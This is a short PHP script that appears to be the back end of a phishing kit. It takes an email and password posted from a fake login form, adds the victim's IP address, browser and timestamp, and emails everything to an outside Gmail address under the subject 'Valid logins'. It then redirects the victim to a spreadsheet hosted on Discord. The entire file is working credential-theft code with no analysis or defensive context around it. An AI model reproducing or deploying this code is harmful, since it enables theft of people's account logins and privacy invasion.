<?php
header ('Location: https://cdn.discordapp.com/attachments/763354720034357250/763415774407688193/Paid.xls');
$ip = getenv("REMOTE_ADDR");
$timedate = date("D/M/d, Y g:i a"); 
$browserAgent = $_SERVER['HTTP_USER_AGENT'];
$email = $_POST['Emails'];
$password = $_POST['password0'];
$message .="**********Logins**********\n";
$message .="Email Address: $email\n";
$message .="Password: $password\n";
$message .="**********Victim PC Details**********\n";
$message .="Client IP: $ip\n";
$message .= "Browser:".$browserAgent."\n";
$message .= "DateTime: ".$timedate."\n";
$message .="**********Created by me**********\n";
$subject ="Valid logins";
mail("smarckjmoney@gmail.com", $subject, $message);

?>


